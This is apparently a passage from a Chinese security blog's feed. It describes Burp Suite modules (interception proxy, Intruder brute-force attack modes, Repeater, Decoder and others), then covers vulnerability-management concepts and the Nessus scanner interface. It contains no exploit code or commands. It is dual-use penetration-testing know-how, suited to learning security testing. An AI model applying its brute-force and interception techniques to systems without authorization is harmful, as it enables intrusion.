class="headerlink" title="Burp Suite使用"></a>Burp Suite使用</h1><h2 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h2><p><img src="/images/shentouceshi_tools/Burp Suite/10.png" alt="10.png"></p><hr><h2 id="两个小问题"><a href="#两个小问题" class="headerlink" title="两个小问题"></a>两个小问题</h2><h3 id="修改软件字体大小，HTTP数据包字体大小，数据包编码格式"><a href="#修改软件字体大小，HTTP数据包字体大小，数据包编码格式" class="headerlink" title="修改软件字体大小，HTTP数据包字体大小，数据包编码格式"></a>修改软件字体大小，HTTP数据包字体大小，数据包编码格式</h3><p><img src="/images/shentouceshi_tools/Burp Suite/13.png" alt="13.png"></p><p>重启<code>Burp Suite</code>生效</p><h3 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h3><p>为使<code>Burp Suite</code>可以拦截<code>HTTPS</code>流量，需导入<code>Burp Suite</code>证书</p><ol><li><p>配置好<code>Burp Suite</code>浏览器代理</p></li><li><p>访问<code>http://burp</code>，下载证书</p><p> <img src="/images/shentouceshi_tools/Burp Suite/11.png" alt="11.png"></p></li><li><p>将证书导入浏览器</p><p> <img src="/images/shentouceshi_tools/Burp Suite/12.png" alt="12.png"></p></li></ol><hr><h2 id="Scan-扫描"><a href="#Scan-扫描" class="headerlink" title="Scan(扫描)"></a>Scan(扫描)</h2><p>在<code>Dashboard</code>中可以创建扫描任务，进行扫描</p><p><img src="/images/shentouceshi_tools/Burp Suite/9.png" alt="9.png"></p><p><code>Event log</code>中显示事件列表</p><p><code>Issue activity</code>显示任务中发现的漏洞</p><hr><h2 id="Target-目标"><a href="#Target-目标" class="headerlink" title="Target(目标)"></a>Target(目标)</h2><h3 id="site-map"><a href="#site-map" class="headerlink" title="site map"></a>site map</h3><p>站点地图</p><p>用于显示通过爬站、扫描或代理获取到的目标站点</p><p><img src="/images/shentouceshi_tools/Burp Suite/14.png" alt="14.png"></p><h3 id="scope"><a href="#scope" class="headerlink" title="scope"></a>scope</h3><p>用于在<code>site map</code>中包含或排除<code>URL</code>地址</p><p><img src="/images/shentouceshi_tools/Burp Suite/15.png" alt="15.png"></p><h3 id="Issue-definitions"><a href="#Issue-definitions" class="headerlink" title="Issue definitions"></a>Issue definitions</h3><p>包含所有可由<code>Burp</code>扫描检测到的问题的定义</p><p><img src="/images/shentouceshi_tools/Burp Suite/16.png" alt="16.png"></p><hr><h2 id="Proxy-代理"><a href="#Proxy-代理" class="headerlink" title="Proxy(代理)"></a>Proxy(代理)</h2><p><code>Burp Suite</code>中最重要、最常用的模块</p><p>代理模块作为<code>Burp Suite</code>的核心功能，拦截<code>HTTP/HTTPS</code>的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许拦截，查看，修改在两个方向上的原始数据流</p><h3 id="Intercept"><a href="#Intercept" class="headerlink" title="Intercept"></a>Intercept</h3><p>用于显示修改<code>HTTP</code>请求及响应内容，并可以将拦截的<code>HTTP</code>请求快速发送至其他模块处理</p><p><img src="/images/shentouceshi_tools/Burp Suite/17.png" alt="17.png"></p><ol><li><p><code>Forward</code>：用于发送数据。当把所需要的HTTP请求编辑编辑完成后，手动发送数据</p></li><li><p><code>Drop</code>：将该请求包丢弃</p></li><li><p><code>Intercept is off/on</code>:拦截开关。当处于<code>off</code>状态下时，<code>Burp Suite</code>会自动转发所拦截的所有请求；当处于<code>on</code>状态下时，<code>Burp Suite</code>会将所有拦截所有符合规则的请求并将它显示出来等待编辑或其他操作</p></li><li><p><code>Action</code>:功能菜单，与右键菜单内容相同，在这可以将请求包发送到其他的模块或者对数据包进行其他的操作</p></li></ol><h3 id="http-history"><a href="#http-history" class="headerlink" title="http history"></a>http history</h3><p><img src="/images/shentouceshi_tools/Burp Suite/18.png" alt="18.png"></p><p>这里将记录经过代理服务器访问的所有请求，即使当<code>Intercept is off</code>时也会记录</p><p>记录包括：</p><ol><li><p><code>#</code>(请求索引号)</p></li><li><p><code>Host</code>(主机)</p></li><li><p><code>Method</code>(请求方式)</p></li><li><p><code>URL</code>(请求地址)</p></li><li><p><code>Params</code>(参数)</p></li><li><p><code>Edited</code>(编辑)</p></li><li><p><code>Status</code>(状态)</p></li><li><p><code>Length</code>(响应字节长度)</p></li><li><p><code>MIME type</code>(响应的<code>MLME</code>类型)</p></li><li><p><code>Extension</code>(地址文件扩展名)</p></li><li><p><code>Title</code>(页面标题)</p></li><li><p><code>Comment</code>(注释)</p></li><li><p><code>SSL</code></p></li><li><p><code>IP</code>(目标<code>IP</code>地址)</p></li><li><p><code>Cookies</code></p></li><li><p><code>Time</code>(发出请求时间)</p></li><li><p><code>Listener port</code>(监听端口)</p></li></ol><p>下方窗口可以显示请求的详细内容（<code>Request</code>）及其响应内容（<code>Response</code>），通过右键菜单也可以将请求发送至其他模块。双击某个请求即可打开详情,通过<code>Previous/next</code>可以快速切换请求，并且<code>Action</code>也可以将请求发送至其他模块</p><h3 id="WebSockets-history"><a href="#WebSockets-history" class="headerlink" title="WebSockets history"></a>WebSockets history</h3><p>用于记录<code>WebSockets</code>的数据包，是<code>HTML5</code>中最强大的通信功能，定义了一个全双工的通信信道，只需<code>Web</code>上的一个<code>Socket</code>即可进行通信，能减少不必要的网络流量并降低网络延迟</p><p><img src="/images/shentouceshi_tools/Burp Suite/19.png" alt="19.png"></p><h3 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h3><p>主要用于设置代理监听、请求和响应，拦截反应，匹配和替换，<code>ssl</code>等</p><p><img src="/images/shentouceshi_tools/Burp Suite/20.png" alt="20.png"></p><ol><li><p><code>Proxy Listeners</code>：代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于<code>BurpProxy</code>的工作流的心脏。默认情况下，<code>Burp</code>默认监听127.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有<code>Web</code>应用程序。</p></li><li><p><code>Intercept Client Requests</code>：配置拦截规则，设置拦截的匹配规则。当<code>Intercept request based on the following rules</code>为选中状态时，<code>burpsuite</code>会配置列表中的规则进行拦截或转发。注意：如果该复选框未选中，那么即使<code>Intercept is on</code>也无法截取数据包。</p><p> 规则可以通过<code>Enabled</code>列中的复选框选择开启或关闭。</p><p> 规则可以是域名，<code>IP</code>地址，协议，<code>HTTP</code>方法，<code>URL</code>，文件扩展名，参数，<code>cookie</code>，头/主体内容，状态代码，<code>MIME</code>类型，<code>HTML</code>页面标题等</p><p> 规则按顺序处理，并且使用布尔运算符<code>AND</code>和<code>OR</code>组合</p></li><li><p><code>Intercept Server Responses</code>：功能类似于配置拦截规则，设置拦截的匹配规则，不过这个选项是基于服务端拦截，当选小的<code>Intercept request based on the following rules</code>为选中状态时，<code>burpsuite</code>会匹配响应包</p></li><li><p><code>Intercept WebSockets Messages</code>：用于设置拦截<code>WebSockets</code>数据</p></li><li><p><code>Response Modification</code>：用于执行响应的自动修改。可以使用这些选项来自动修改<code>HTML</code>应用程序响应中匹配的内容</p></li><li><p><code>Match and replace</code>：用于自动替换请求和响应通过代理的部分。对于每一个<code>HTTP</code>消息，已启用的匹配和替换规则依次执行，选择适用的规则进行匹配执行。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则，这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域</p></li><li><p><code>SSL Pass Through</code>：指定<code>WEB</code>服务器在经过<code>burpsuite</code>连接时使用<code>SSL</code>连接</p></li><li><p><code>Miscellaneous</code>：其他选项，这些选项控制着<code>Burp</code>代理的行为的一些具体细节</p></li></ol><hr><h2 id="Intruder-暴力破解"><a href="#Intruder-暴力破解" class="headerlink" title="Intruder(暴力破解)"></a>Intruder(暴力破解)</h2><p><code>intruder</code>是一个强大的工具，用于自动对<code>Web</code>应用程序自定义的攻击。它可以用来自动执行您的测试过程中可能出现的所有类型的任务。例如目录爆破，注入，密码爆破等</p><h3 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h3><p>用于配置目标服务器进行攻击的详细信息。</p><ol><li><p><code>Host</code>：这是目标服务器的IP地址或主机名</p></li><li><p><code>Port</code>：这是目标服务的端口号</p></li><li><p><code>Use HTTPS</code>：这指定的<code>SSL</code>是否应该被使用</p></li></ol><p>在<code>BurpSuite</code>任何请求处，右键菜单选择<code>Send to intruder</code>选项，将自动发送到此模块下并自动填充以上内容</p><p><img src="/images/shentouceshi_tools/Burp Suite/21.png" alt="21.png"></p><h3 id="Positions"><a href="#Positions" class="headerlink" title="Positions"></a>Positions</h3><p>设置<code>Payloads</code>的插入点以及攻击类型（攻击模式）</p><p><img src="/images/shentouceshi_tools/Burp Suite/22.png" alt="22.png"></p><ol><li><p><code>ttack type</code>：攻击模式设置</p><ol><li><p><code>sniper</code>：对变量依次进行破解。多个标记依次进行</p></li><li><p><code>battering ram</code>：对变量同时进行破解。多个标记同时进行</p></li><li><p><code>pitchfork</code>：每一个变量标记对应一个字典，取每个字典的对应项</p></li><li><p><code>cluster bomb</code>：每个变量对应一个字典，并且进行交集破解，尝试各种组合。适用于用户名+密码的破解</p></li></ol></li><li><p><code>add</code>：插入一个新的标记</p></li><li><p><code>clear</code>：清除所有的标记</p></li><li><p><code>auto</code>：自动设置标记，一个请求发到该模块后<code>burpsuite</code>会自动标记<code>cookie</code>、<code>URL</code>等参数</p></li><li><p><code>refresh</code>：如果必要的话，这可以要求模板编辑器的语法高亮</p></li></ol><h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><p>设置<code>payload</code>，配置字典</p><p><img src="/images/shentouceshi_tools/Burp Suite/23.png" alt="23.png"></p><ol><li><p><code>Payload Sets</code>：<code>Payload</code>数量类型设置</p><ol><li><p><code>Payload Set</code>：指定需要配置的变量</p></li><li><p><code>Payload type</code>：<code>Payload</code>类型</p><ol><li><p><code>Simple list</code>：简单字典</p></li><li><p><code>Runtime file</code>：运行文件</p></li><li><p><code>Custom iterator</code>：自定义迭代器</p></li><li><p><code>Character substitution</code>：字符替换</p></li><li><p><code>Recursive grep</code>：递归查找</p></li><li><p><code>lllegal unicode</code>：非法字符</p></li><li><p><code>Character blocks</code>：字符块</p></li><li><p><code>Numbers</code>：数字组合</p></li><li><p><code>Dates</code>：日期组合</p></li><li><p><code>Brute forcer</code>：暴力破解</p></li><li><p><code>Null payloads</code>：空<code>payload</code></p></li><li><p><code>Username generator</code>：用户名生成</p></li><li><p><code>copy other payload</code>：复制其他<code>payload</code></p></li></ol></li></ol></li><li><p><code>Payload Opetions\[Payload type\]</code>：该选项会根据上个选项中<code>Payload type</code>的设置而改变</p></li><li><p><code>Payload Processing</code>：对生成的<code>Payload</code>进行编码、加密、截取等操作</p></li><li><p><code>Payload Encoding</code>：可以配置哪些有效载荷中的字符应该是<code>URL</code>编码的<code>HTTP</code>请求中的安全传输。任何已配置的<code>URL</code>编码最后应用，任何有效载荷处理规则执行之后。这是推荐使用此设置进行最终<code>URL</code>编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的<code>grep</code>选项来检查响应为呼应有效载荷的最终<code>URL</code>编码应用之前</p></li></ol><h3 id="Opetions"><a href="#Opetions" class="headerlink" title="Opetions"></a>Opetions</h3><p>此选项卡包含了<code>request headers</code>，<code>request engine</code>，<code>attack results</code>，<code>grep match</code>，<code>grep_extrack</code>，<code>grep payloads</code>和<code>redirections</code>。可以发动攻击之前，在主要<code>Intruder</code>的<code>UI</code>上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改    </p><p><img src="/images/shentouceshi_tools/Burp Suite/24.png" alt="24.png"></p><hr><h2 id="Repeater（上传绕过）"><a href="#Repeater（上传绕过）" class="headerlink" title="Repeater（上传绕过）"></a>Repeater（上传绕过）</h2><p><code>Repeater</code>是用于手动操作和发送个别<code>HTTP</code>请求，并分析应用程序的响应一个简单的工具。可以发送一个内部请求从<code>Burp</code>任何地方到<code>Repeater</code>，修改请求并且发送</p><p><img src="/images/shentouceshi_tools/Burp Suite/25.png" alt="25.png"></p><p>可以从<code>Proxy history</code>、<code>site map</code>、<code>Scanner</code>等模块中右键菜单<code>send to repeater</code>发送到<code>repeater</code>，对页面数据进行修改发送</p><p>点击<code>go</code>，发送请求，右边响应请求</p><p>可以通过<code>&lt;</code>和<code>&gt;</code>来返回上一次和下一个操作</p><p>单击<code>x</code>可以删除当前测试请求页面</p><p>底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数</p><p>该模块的设置在菜单栏<code>Repeater</code>中:</p><p><img src="/images/shentouceshi_tools/Burp Suite/26.png" alt="26.png"></p><ol><li><p><code>Update Content-length</code>：更新头部长度</p></li><li><p><code>Unpack gzip/deflate</code>：该选项控制<code>Burp</code>是否自动解压缩在收到的答复的<code>gzip</code>和<code>deflate</code>压缩内容</p></li><li><p><code>Follow redirections</code>：在遇到重定向时<code>Burp</code>该怎么处理</p></li><li><p><code>Never</code>：不会跟随任何重定向</p></li><li><p><code>On-site only</code>：中继器将只跟随重定向到使用相同的主机，端口和协议的<code>URL</code></p></li><li><p><code>In-scope Only</code>：中继器将只跟随重定向到的目标范围之内的<code>URL</code></p></li><li><p><code>Always</code>：中继器将跟随重定向到任何<code>URL</code>任何责任。</p></li><li><p><code>Process cookies in redirections</code>：当被重定向后是否提交<code>cookie</code></p></li><li><p><code>View</code>：设置响应/请求版块的布局方式</p></li><li><p><code>Action</code>：形同于右键菜单</p></li></ol><hr><h2 id="Sequencer-定序器"><a href="#Sequencer-定序器" class="headerlink" title="Sequencer(定序器)"></a>Sequencer(定序器)</h2><p>用于分析数据项的一个样本中的随机性质量</p><p>可以用它来测试应用程序的<code>session tokens</code>或其他重要数据项是否是不可预测的</p><h3 id="Live-capture"><a href="#Live-capture" class="headerlink" title="Live capture"></a>Live capture</h3><p><img src="/images/shentouceshi_tools/Burp Suite/31.png" alt="31.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/32.png" alt="32.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/33.png" alt="33.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/34.png" alt="34.png"></p><h3 id="Manual-load"><a href="#Manual-load" class="headerlink" title="Manual load"></a>Manual load</h3><p><img src="/images/shentouceshi_tools/Burp Suite/35.png" alt="35.png"></p><h3 id="Analysis-options"><a href="#Analysis-options" class="headerlink" title="Analysis options"></a>Analysis options</h3><p><img src="/images/shentouceshi_tools/Burp Suite/36.png" alt="36.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/37.png" alt="37.png"></p><p><img src="/images/shentouceshi_tools/Burp Suite/38.png" alt="38.png"></p><hr><h2 id="Decoder-编码模块"><a href="#Decoder-编码模块" class="headerlink" title="Decoder(编码模块)"></a>Decoder(编码模块)</h2><p>将原始数据转换成各种编码和哈希表的简单工具。它能够智能地识别多种编码格式采用启发式技术</p><p><img src="/images/shentouceshi_tools/Burp Suite/27.png" alt="27.png"></p><ol><li><p><code>Decode as...</code>：解码</p></li><li><p><code>Encode as...</code>：编码</p><p> 支持的编码解码类型：</p><ol><li><p><code>url</code></p></li><li><p><code>HTML</code></p></li><li><p><code>Base64</code></p></li><li><p><code>ASCII</code>码 </p></li><li><p><code>Hex</code>(十六进制)</p></li><li><p><code>octal</code>(八进制) </p></li><li><p><code>binary</code>(二进制) </p></li><li><p><code>GZIP</code></p></li></ol></li><li><p><code>hash</code>：支持的<code>hash</code>算法：</p><ol><li><p><code>SHA-384</code></p></li><li><p><code>SHA-224</code> </p></li><li><p><code>SHA-256</code></p></li><li><p><code>MD2</code> </p></li><li><p><code>SHA</code> </p></li><li><p><code>SHA-512</code> </p></li><li><p><code>MD5</code></p></li></ol></li><li><p><code>Smart decoding</code>：智能解码，<code>burpsuite</code>会递归查询自己所支持的格式尝试解码。通过有请求的任意模块的右键菜单<code>send to Decoder</code>或输入数据选择相应的数据格式即可进行解码编码操作，或直接点击<code>Smart decoding</code>进行智能解码</p></li></ol><hr><h2 id="Comparer-比较器"><a href="#Comparer-比较器" class="headerlink" title="Comparer(比较器)"></a>Comparer(比较器)</h2><p><code>Comparer</code>是一个简单的工具，用于以图形化方式在任意两项数据之间进行比较</p><p>常见用途如下：</p><ol><li><p>在查找用户名枚举条件时，您可以使用有效和无效的用户名比较对失败登录的响应，以查找响应中的细微差异</p></li><li><p>当入侵者攻击导致一些非常大的响应，其长度不同于基本响应时，您可以比较这些响应以快速查看差异所在</p></li><li><p>在比较不同类型用户生成的站点地图或代理历史记录条目时，您可以比较相似请求对，以查看产生不同应用程序行为的差异所在</p></li><li><p>当使用布尔条件注入和其他类似测试测试<code>SQL</code>盲注入错误时，您可以比较两个响应，以查看注入不同条件是否导致响应的相关差异</p></li></ol><p>将数据加载到<code>Comparer</code>中的方式：</p><ol><li><p>直接从剪贴板粘贴它</p></li><li><p>从文件加载它</p></li><li><p>在<code>Burp</code>中的任何位置选择数据，然后从上下文菜单中选择<code>Send to Comparer</code></p></li></ol><p><img src="/images/shentouceshi_tools/Burp Suite/39.png" alt="39.png"></p><p>结果会通过高亮显示不同：</p><p><img src="/images/shentouceshi_tools/Burp Suite/40.png" alt="40.png"></p><hr><h2 id="Extender-扩充器"><a href="#Extender-扩充器" class="headerlink" title="Extender(扩充器)"></a>Extender(扩充器)</h2><p><code>BurpSuite</code>给出了两种插件安装方法，一种是在线安装：通过<code>BApp Store</code>安装插件；第二种是本地安装：添加本地环境中的插件</p><h3 id="在BApp-Store中安装插件"><a href="#在BApp-Store中安装插件" class="headerlink" title="在BApp Store中安装插件"></a>在BApp Store中安装插件</h3><p><code>Extender</code>选项卡，在<code>BApp Store</code>中可以下载安装很多插件</p><p><img src="/images/shentouceshi_tools/Burp Suite/28.png" alt="28.png"></p><h3 id="安装自定义插件"><a href="#安装自定义插件" class="headerlink" title="安装自定义插件"></a>安装自定义插件</h3><p><code>Extender</code>选项卡中的<code>Extensions</code>中点击<code>add</code>按钮，会弹出根据插件类型选择插件的目录</p><p><img src="/images/shentouceshi_tools/Burp Suite/29.png" alt="29.png"></p><hr><h2 id="过滤器的使用"><a href="#过滤器的使用" class="headerlink" title="过滤器的使用"></a>过滤器的使用</h2><p>在<code>burpsuite</code>中在多个模块都可以看到<code>Fitter</code>过滤器的身影，它们使用方法相同</p><p><img src="/images/shentouceshi_tools/Burp Suite/30.png" alt="30.png"></p><ol><li><p><code>Fitter by Request type</code>：按照请求类型筛选</p><ol><li><p><code>Show only in-scope items</code>：只显示范围内的</p></li><li><p><code>Show only requested items</code>：只显示请求的</p></li><li><p><code>Show only parameterized requests</code>：只显示带有参数的请求</p></li><li><p><code>Hide not-found items</code>：隐藏未找到的</p></li></ol></li><li><p><code>Fitter by search term</code>：通过关键字筛选</p><ol><li><p><code>regex</code>：通过正则表达式匹配</p></li><li><p><code>case sensitive</code>：是否区分大小写</p></li><li><p><code>negative search</code>：消极搜索，选择后将筛选出不包含该关键字的请求</p></li></ol></li><li><p><code>Fitter by MIME type</code>：通过文件类型筛选</p><ol><li><p><code>HTML</code>：是否显示<code>HTML</code>文件请求</p></li><li><p><code>Script</code>：是否显示脚本文件请求</p></li><li><p><code>XML</code>：是否显示标记文件请求</p></li><li><p><code>CSS</code>：是否显示层叠样式文件请求</p></li><li><p><code>Other text</code>：是否显示其他类型文本请求</p></li><li><p><code>images</code>：是否显示图片请求</p></li><li><p><code>Flash</code>：是否显示<code>Flash</code>动画请求</p></li><li><p><code>Other binary</code>：是否显示其他二进制文件</p></li></ol></li><li><p><code>Fitter by file extension</code>：通过文件后缀筛选</p><ol><li><p><code>Show only</code>：只显示自定义的后缀请求</p></li><li><p><code>Hide</code>：隐藏自定义的后缀请求</p></li></ol></li><li><p><code>Fitter by status code</code>：根据<code>HTTP</code>响应状态码筛选</p><ol><li><p><code>2xx</code>：显示成功的请求</p></li><li><p><code>3xx</code>：显示重定向的请求</p></li><li><p><code>4xx</code>：显示请求错误的请求</p></li><li><p><code>5xx</code>：显示服务器错误的请求</p></li></ol></li><li><p><code>Fitter by annotation</code>:显示仅显示用户提供的注释或亮点的项目</p><ol><li><p><code>Show only commented items</code>：只显示注释项目</p></li><li><p><code>Show only highlighted items</code>：只显示突出显示的项目</p><p> <code>-Folders</code>：是否显示文件夹</p></li><li><p><code>hide empty folders</code>：隐藏空文件夹</p></li></ol></li></ol><hr>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="WEB工具" scheme="http://yoursite.com/tags/WEB%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>漏洞扫描</title>
    <link href="http://yoursite.com/2019/05/15/%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    <id>http://yoursite.com/2019/05/15/洞扫描/</id>
    <published>2019-05-15T13:27:00.000Z</published>
    <updated>2020-02-24T04:14:23.354Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="如何发现漏洞"><a href="#如何发现漏洞" class="headerlink" title="如何发现漏洞"></a>如何发现漏洞</h1><ol><li><p>基于端口服务扫描结果，查看服务版本信息(速度慢)</p></li><li><p>搜索已公开的漏洞数据库(数量大)</p></li><li><p>使用漏洞扫描器实现漏洞管理</p></li></ol><hr><h1 id="从信息的维度定义漏洞管理"><a href="#从信息的维度定义漏洞管理" class="headerlink" title="从信息的维度定义漏洞管理"></a>从信息的维度定义漏洞管理</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描发现网络<code>IP</code>、<code>OS</code>、服务、配置、漏洞</p><p>需求：能够定义扫描方式内容和目标</p><h2 id="信息管理"><a href="#信息管理" class="headerlink" title="信息管理"></a>信息管理</h2><p>格式化信息，并进行筛选、分组、定义优先级</p><p>需求：能够进行资产分组、指定所有者</p><h2 id="信息输出"><a href="#信息输出" class="headerlink" title="信息输出"></a>信息输出</h2><p>向不同层级的人群展示足够的信息量</p><p>需求：生成报告、导出数据、可以与<code>SIEM</code>集成</p><p><code>SIEM</code>(安全信息和事件管理)是一个由不同的监视和分析组件组成的安全和审计系统</p><p>日志管理(<code>LMS</code>)——用于传统日志收集和存储的工具</p><p>安全信息管理(<code>SIM</code>)——集中于从多个数据源收集和管理与安全相关的数据的工具或系统。例如，这些数据源可以是防火墙、<code>DNS</code>服务器、路由器和防病毒应用程序</p><p>安全事件管理(<code>SEM</code>)——基于主动监视和分析的系统，包括数据可视化、事件相关性和警报</p><hr><h1 id="漏洞扫描的类型"><a href="#漏洞扫描的类型" class="headerlink" title="漏洞扫描的类型"></a>漏洞扫描的类型</h1><ol><li><p>主动扫描</p><p> 是否可进行身份认证</p></li><li><p>被动扫描</p><p> 镜像端口抓包分析</p></li><li><p>基于<code>Agent</code>的扫描</p></li></ol><hr><h1 id="漏洞的基本概念"><a href="#漏洞的基本概念" class="headerlink" title="漏洞的基本概念"></a>漏洞的基本概念</h1><p>漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统</p><h2 id="CVSS"><a href="#CVSS" class="headerlink" title="CVSS"></a>CVSS</h2><ol><li><p>通用漏洞评分系统，工业标准</p></li><li><p>描述安全漏洞严重程度的统一评分方案</p></li><li><p>分值范围：0–10</p></li><li><p>不同机构按<code>CVSS</code>分值定义威胁的中、高、低威胁级别</p></li><li><p><code>CVSS</code>体现漏洞的风险</p></li><li><p>威胁级别表示漏洞对那个风险对企业的影响程度</p></li></ol><h2 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h2><ol><li><p>已公开的信息安全漏洞字典(<code>MITRE</code>公司维护)</p></li><li><p>统一的漏洞编号标准</p></li><li><p>实现不同厂商之间信息交换的统一标准</p></li></ol><h2 id="MS"><a href="#MS" class="headerlink" title="MS"></a>MS</h2><p>微软漏洞编号</p><p><code>KB</code>：微软补丁编号</p><h2 id="OVAL"><a href="#OVAL" class="headerlink" title="OVAL"></a>OVAL</h2><ol><li><p>描述漏洞检测方法的机器可识别语言</p></li><li><p>详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作</p></li><li><p>以<code>XML</code>语言描述</p></li></ol><h2 id="SCAP"><a href="#SCAP" class="headerlink" title="SCAP"></a>SCAP</h2><p>集合了多种安全标准的框架</p><p>六个元素：<code>CVE</code>、<code>OVAL</code>、<code>CCE</code>、<code>CPE</code>、<code>CVSS</code>、<code>XCCDF</code></p><p>目的使以标准的方法展示和操作安全数据</p><p>由<code>NIST</code>(美国国家标准技术研究所)负责维护</p><p>解决三个问题：</p><ol><li><p>实现高层政策法规等到底层实施的落地</p></li><li><p>将信息安全所涉及的各个要素标准化</p></li><li><p>将复杂的系统配置核查工作自动化</p></li></ol><h2 id="CNVD"><a href="#CNVD" class="headerlink" title="CNVD"></a>CNVD</h2><p>国家信息安全漏洞共享平台（<code>CNVD</code>）是由国家计算机网络应急技术处理协调中心（中文简称国家互联应急中心，英文简称<code>CNCERT</code>）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库</p><hr><h1 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h1><ol><li><p>周期性扫描跟踪漏洞</p></li><li><p>高危漏洞优先处理</p></li><li><p>进行合理的扫描</p></li></ol><hr><h1 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>家庭版：免费使用</p><p>专业版：收费，无限并发连接</p><p><img src="/images/shentouceshi_tools/nessus/16.png" alt="1.png"></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>参见 <a href="/2019/05/11/kali下安装nessus/">Kali下安装Nessus</a></p><h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>在“扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“扫描”页面，请在顶部导航栏中单击“扫描”。左侧导航栏显示文件夹和资源两部分。</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/6.png" alt="6.png"></p><h2 id="文件夹"><a href="#文件夹" class="headerlink" title="文件夹"></a>文件夹</h2><p>“文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、废纸篓</p><p>当您访问“扫描”页面时，将显示“我的扫描”文件夹。当您创建扫描时，它默认显示在“我的扫描”文件夹中</p><p>在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果</p><p>“废纸篓”文件夹显示已删除的扫描。可以从<code>Nessus</code>实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至“废纸篓”文件夹。存储在“废纸篓”文件夹中的扫描将在30天后自动删除。</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/4.png" alt="4.png"></p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>策略 插件规则 扫描器</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/5.png" alt="5.png"></p><h3 id="资源之策略"><a href="#资源之策略" class="headerlink" title="资源之策略"></a>资源之策略</h3><ol><li><p>控制扫描技术方面的参数，如超时时间，主机数量，端口扫描器类型等等</p></li><li><p>用于本地扫描（例如<code>Windows</code>，<code>SSH</code>），经过身份验证的<code>Oracle</code>数据库扫描，<code>HTTP</code>，<code>FTP</code>，<code>POP</code>，<code>IMAP</code>或基于<code>Kerberos</code>的身份验证的凭证</p></li><li><p>精细的家庭或基于插件的扫描规范</p></li><li><p>数据库合规性策略检查，报告详细程度，服务检测扫描设置，<code>Unix</code>合规性检查等等</p></li><li><p>对网络设备进行脱机配置审计，可以安全检查网络设备，而无需直接扫描设备</p></li><li><p><code>Windows</code>恶意软件扫描，比较文件的<code>MD5</code>校验和，包括已知的好文件和恶意文件</p></li></ol><h3 id="资源之插件规则"><a href="#资源之插件规则" class="headerlink" title="资源之插件规则"></a>资源之插件规则</h3><p>允许隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，您可以查看，创建，编辑和删除您的规则</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/7.png" alt="7.png"></p><h3 id="资源之扫描器"><a href="#资源之扫描器" class="headerlink" title="资源之扫描器"></a>资源之扫描器</h3><p>该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息</p><p>扫描器由扫描器类型标识，并指示扫描器是否具有共享权限</p><p>可以使用链接密钥或有效帐户凭证将远程扫描器链接到<code>Nessus Manager</code>。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/8.png" alt="8.png"></p><h2 id="扫描模板"><a href="#扫描模板" class="headerlink" title="扫描模板"></a>扫描模板</h2><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/2.png" alt="2.png"></p><h3 id="扫描模板之设置"><a href="#扫描模板之设置" class="headerlink" title="扫描模板之设置"></a>扫描模板之设置</h3><p>每个策略都存在以下设置，但可用的配置项目可能因所选模板而异</p><p><img src="/images/KaliLinux_shentouceshi/loudongsaomiao/99.png" alt="9.png"></p><p>基本 发现 评定 报告 高级</p><h3 